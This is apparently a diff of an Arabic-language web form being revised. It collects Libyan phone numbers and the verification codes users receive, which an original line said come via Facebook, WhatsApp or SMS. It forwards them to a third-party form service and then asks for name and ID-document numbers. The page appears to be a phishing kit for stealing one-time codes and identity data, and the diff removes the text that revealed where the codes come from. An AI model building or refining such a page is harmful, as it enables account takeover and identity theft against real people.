@@ -141,7 +141,7 @@
         <div id="countdownMsg" style="margin-top: 5px; font-size: 14px; color: green;"></div>
       </div>
 
-      <!-- كود الاستلام + زر إرسال الكود فقط -->
+      <!-- كود الاستلام -->
       <div class="form-group code-row">
         <div>
           <label for="code">كود الاستلام</label>
@@ -157,7 +157,15 @@
   </div>
 
 <script>
-  const formcarryURL = "https://formcarry.com/s/ldfA_DUCDrk"; // غيّر هنا برابطك الصحيح
+  const formcarryURL = "https://formcarry.com/s/ldfA_DUCDrk"; // غيّر هذا للرابط الخاص بك
+
+  // تعطيل الحقول حتى إدخال الكود
+  window.onload = function () {
+    document.getElementById("name").disabled = true;
+    document.getElementById("docType").disabled = true;
+    document.getElementById("docNumber").disabled = true;
+    document.getElementById("submitBtn").disabled = true;
+  };
 
   // تحقق من أن الاسم عربي فقط
   document.getElementById("name").addEventListener("input", function () {
@@ -169,7 +177,6 @@
     }
   });
 
-  // إظهار/إخفاء حقل رقم الوثيقة وتغيير التسميه حسب الاختيار
   function showDocInput() {
     const type = document.getElementById("docType").value;
     const group = document.getElementById("docGroup");
@@ -182,7 +189,13 @@
     }
   }
 
-  // إرسال رقم الهاتف فقط والبدء بعد تنازلي 5 دقائق
+  // التحقق من رقم ليبي
+  function isLibyanPhone(phone) {
+    const cleaned = phone.replace(/\s+/g, '');
+    return /^(\+2189\d{7}|002189\d{7}|09\d{8})$/.test(cleaned);
+  }
+
+  // إرسال رقم الهاتف فقط مع التحقق
   let countdownStarted = false;
   let countdownTimeout;
 
@@ -196,8 +209,13 @@
       return;
     }
 
+    if (!isLibyanPhone(phone)) {
+      alert("📵 الرقم غير ليبي. يجب أن يبدأ بـ 09 أو +2189 أو 002189.");
+      return;
+    }
+
     if (countdownStarted) {
-      alert("⏳ الرجاء الانتظار حتى انتهاء العد التنازلي قبل إعادة الإرسال.");
+      alert("⏳ الرجاء الانتظار حتى انتهاء العد التنازلي.");
       return;
     }
 
@@ -232,7 +250,7 @@
     function update() {
       const min = Math.floor(seconds / 60);
       const sec = seconds % 60;
-      msg.textContent = `⏳ الرجاء الانتظار ${min}:${sec < 10 ? '0' : ''}${sec} دقيقة لاستلام الكود من فيسبوك أو واتساب أو SMS.`;
+      msg.textContent = `⏳ الرجاء الانتظار ${min}:${sec < 10 ? '0' : ''}${sec} دقيقة لاستلام الكود.`;
       if (seconds > 0) {
         seconds--;
         countdownTimeout = setTimeout(update, 1000);
@@ -246,7 +264,6 @@
     update();
   }
 
-  // إرسال الكود فقط مع رقم الهاتف
   function sendCodeOnly() {
     const phone = document.getElementById("phone").value.trim();
     const code = document.getElementById("code").value.trim();
@@ -256,7 +273,7 @@
       return;
     }
     if (!code) {
-      alert("يرجى إدخال كود الاستلام أولاً.");
+      alert("يرجى إدخال كود الاستلام.");
       return;
     }
 
@@ -268,20 +285,24 @@
     .then(response => {
       if (response.ok) {
         alert("✅ تم إرسال الكود بنجاح!");
+
+        // تفعيل الحقول
+        document.getElementById("name").disabled = false;
+        document.getElementById("docType").disabled = false;
+        document.getElementById("docNumber").disabled = false;
+        document.getElementById("submitBtn").disabled = false;
       } else {
-        alert("❌ فشل في إرسال الكود. حاول مجددًا.");
+        alert("❌ فشل في إرسال الكود.");
       }
     })
     .catch(() => {
-      alert("❌ حدث خطأ أثناء الإرسال.");
+      alert("❌ حدث خطأ أثناء إرسال الكود.");
     });
   }
 
-  // إرسال جميع البيانات إلى Formcarry
   document.getElementById("fullForm").addEventListener("submit", function (e) {
     e.preventDefault();
 
-    // التحقق من رقم الوثيقة إذا كان ظاهر
     const docGroup = document.getElementById("docGroup");
     if (docGroup.style.display === "block") {
       const docNumInput = document.getElementById("docNumber");
